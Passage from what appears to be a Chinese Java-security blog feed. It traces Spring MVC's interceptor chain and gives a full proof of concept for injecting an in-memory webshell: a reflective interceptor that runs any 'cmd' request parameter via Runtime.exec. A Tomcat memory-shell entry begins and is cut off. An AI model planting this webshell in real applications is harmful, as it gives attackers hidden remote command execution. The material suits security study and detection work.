class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>在springmvc.xml配置文件中配置相应的Interceptor<pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>mvc<span class="token operator">:</span>interceptors<span class="token operator">&gt;</span><span class="token operator">&lt;</span>mvc<span class="token operator">:</span>interceptor<span class="token operator">&gt;</span><span class="token operator">&lt;</span>mvc<span class="token operator">:</span>mapping path<span class="token operator">=</span><span class="token string">"/*"</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>bean <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"com.shell.interceptor.Spring_Interceptor"</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>mvc<span class="token operator">:</span>interceptor<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>mvc<span class="token operator">:</span>interceptors<span class="token operator">&gt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>编写对应的Controller<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>shell<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Spring_Controller</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">Login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Success!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>访问对应路径<img src="/img/3-12/20.png"></li></ul><h3 id="request调用流程"><a href="#request调用流程" class="headerlink" title="request调用流程"></a>request调用流程</h3><p>我们首先来探究一下，当一个Request发送到Spring应用时，是如何一步步到达业务逻辑处理层Controller的。<br>在ApplicationFilterChain#internalDoFilter处下一个断点，可以看到此时的调用栈是和启动Tomcat时相同的<br><img src="/img/3-12/21.png"><br>但与Tomcat不同的是，当调用到HttpServlet#service时，最终会调用DispatcherServlet#doDispatch进行逻辑处理，这正是Spring的逻辑处理核心类。<br><img src="/img/3-12/22.png"></p><pre class="language-none"><code class="language-none">doDispatch:1028, DispatcherServlet (org.springframework.web.servlet)doService:963, DispatcherServlet (org.springframework.web.servlet)processRequest:1006, FrameworkServlet (org.springframework.web.servlet)doGet:898, FrameworkServlet (org.springframework.web.servlet)service:655, HttpServlet (javax.servlet.http)service:883, FrameworkServlet (org.springframework.web.servlet)service:764, HttpServlet (javax.servlet.http)internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core) ...</code></pre><p>跟进到getHandler方法</p><pre class="language-none"><code class="language-none">protected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {        if (this.handlerMappings != null) {            for (HandlerMapping mapping : this.handlerMappings) {                HandlerExecutionChain handler = mapping.getHandler(request);                if (handler != null) {                    return handler;                }            }        }        return null;    }</code></pre><p>在 getHandler 方法中，会通过遍历 this.handlerMappings 来获取 HandlerMapping 对象实例 mapping<br><img src="/img/3-12/23.png"><br>而getHandler实际上会调用org.springframework.web.servlet.handler.AbstractHandlerMapping 类的 getHandler 方法，并通过 getHandlerExecutionChain(handler, request) 方法返回 HandlerExecutionChain 类的实例<br><img src="/img/3-12/24.png"><br>跟进AbstractHandlerMapping#getHandlerExecutionChain</p><pre class="language-none"><code class="language-none">protected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {HandlerExecutionChain chain = (handler instanceof HandlerExecutionChain ?(HandlerExecutionChain) handler : new HandlerExecutionChain(handler)); for (HandlerInterceptor interceptor : this.adaptedInterceptors) {if (interceptor instanceof MappedInterceptor) {MappedInterceptor mappedInterceptor = (MappedInterceptor) interceptor;if (mappedInterceptor.matches(request)) {chain.addInterceptor(mappedInterceptor.getInterceptor());}}else {chain.addInterceptor(interceptor);}}return chain;}</code></pre><p>可以看到其通过adaptedInterceptors获取所有Interceptor后进行遍历，其中可以看见一个我们自己定义的Interceptor<br><img src="/img/3-12/25.png"><br>然后通过chain.addInterceptor()将所有Interceptor添加到HandlerExecutionChain中。最后返回到DispatcherServlet#doDispatch()中，调用mappedHandler.applyPreHandle方法<br><img src="/img/3-12/26.png"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">boolean</span> <span class="token function">applyPreHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>interceptorList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">HandlerInterceptor</span> interceptor <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>interceptorList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>interceptor<span class="token punctuation">.</span><span class="token function">preHandle</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>handler<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">triggerAfterCompletion</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>interceptorIndex <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后遍历调用Interceptor中的preHandle()拦截方法。<br>因此当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层</p><pre class="language-none"><code class="language-none">HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Controller</code></pre><h3 id="Interceptor型内存马实现"><a href="#Interceptor型内存马实现" class="headerlink" title="Interceptor型内存马实现"></a>Interceptor型内存马实现</h3><p>通过以上分析，Interceptor实际上是可以拦截所有想到达Controller的请求的。下面的问题就是如何动态地注册一个恶意的Interceptor了。由于Interceptor和Filter有一定的相似之处，因此我们可以仿照Filter型内存马的实现思路</p><ul><li>获取当前运行环境的上下文</li><li>实现恶意Interceptor</li><li>注入恶意Interceptor</li></ul><p><strong>获取环境上下文</strong><br>在Controller型内存马中，给出了四种获取Spring上下文ApplicationContext的方法。下面我们还可以通过反射获取LiveBeansView类的applicationContexts 属性来获取上下文。</p><pre class="language-none"><code class="language-none">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");// 2. 属性被 private 修饰，所以 setAccessible truefiled.setAccessible(true);// 3. 获取一个 ApplicationContext 实例org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();</code></pre><p>org.springframework.context.support.LiveBeansView 类在 spring-context <strong>3.2.x</strong> 版本（现在最新版本是 <strong>5.3.x</strong>）才加入其中，所以比较低版本的 spring 无法通过此方法获得 ApplicationContext 的实例。<br><strong>获取adaptedInterceptors属性值</strong><br>获得 ApplicationContext 实例后，还需要知道 org.springframework.web.servlet.handler.AbstractHandlerMapping 类实例的 bean name 叫什么。<br><img src="/img/3-12/27.png"><br><img src="/img/3-12/28.png"><br>我们可以通过ApplicationContext上下文来获取AbstractHandlerMapping，进而反射获取adaptedInterceptors属性值</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span>AbstractHandlerMapping</span> abstractHandlerMapping <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span>AbstractHandlerMapping</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"requestMappingHandlerMapping"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span>Field</span> field <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span>AbstractHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"adaptedInterceptors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> adaptedInterceptors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span>field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>abstractHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>实现恶意Interceptor</strong><br>这里选择继承HandlerInterceptor类，并重写其preHandle方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>shell<span class="token punctuation">.</span>interceptor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">HandlerInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shell_Interceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                n<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>动态注册Interceptor</strong><br>我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 adaptedInterceptors 属性值中就可以了。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//将恶意Interceptor添加入adaptedInterceptors</span><span class="token class-name">Shell_Interceptor</span> shell_interceptor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shell_Interceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>adaptedInterceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>shell_interceptor<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>shell<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">RequestContextHolder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestAttributes</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">HandlerInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">RequestContextUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inject_Shell_Interceptor_Controller</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/inject"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token comment">//获取上下文环境</span>        <span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token class-name">RequestContextUtils</span><span class="token punctuation">.</span><span class="token function">findWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestAttributes</span><span class="token punctuation">)</span> <span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取adaptedInterceptors属性值</span>        <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span>AbstractHandlerMapping</span> abstractHandlerMapping <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span>AbstractHandlerMapping</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span>Field</span> field <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span>AbstractHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"adaptedInterceptors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> adaptedInterceptors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span>field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>abstractHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//将恶意Interceptor添加入adaptedInterceptors</span>        <span class="token class-name">Shell_Interceptor</span> shell_interceptor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shell_Interceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        adaptedInterceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>shell_interceptor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shell_Interceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span><span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    n<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>访问对应路由/inject<br><img src="/img/3-12/29.png"><br>成功执行<br><img src="/img/3-12/30.png"></p><p>​p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 内存马 </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马</title>
      <link href="/2024/03/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/03/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><p>前置知识：<a href="https://www.yuque.com/yyjccc/pk74ko/ksyiwpex52m9tkdi?view=doc_embed">Tomcat架构</a></p><p>参考：<br><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a><br><a href="https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">Java内存马系列-04-Tomcat 之 Listener 型内存马 | Drunkbaby’s Blog</a><br><a href="https://su18.org/post/memory-shell/">https://su18.org/post/memory-shell/</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>就是根据Tomcat的三大件servlet、linstener、filter注入内存马，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上<br>调式时候需要导入对应tomcat版本的jar包<br><strong>依赖</strong></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>tomcat-catalina<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>8.5.31<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><p>根据Tomcat启动流程<br><img src="/img/3-6/1.png"></p><p>会在ConfigContext#configureContext方法中从xml配置中读取配置，并注册servlet、listener、filter三大件</p><h2 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h2><h3 id="Filter的使用"><a href="#Filter的使用" class="headerlink" title="Filter的使用"></a>Filter的使用</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>memorytrojan<span class="token punctuation">.</span></span><span class="token class-name">Tomcat</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span><span class="token 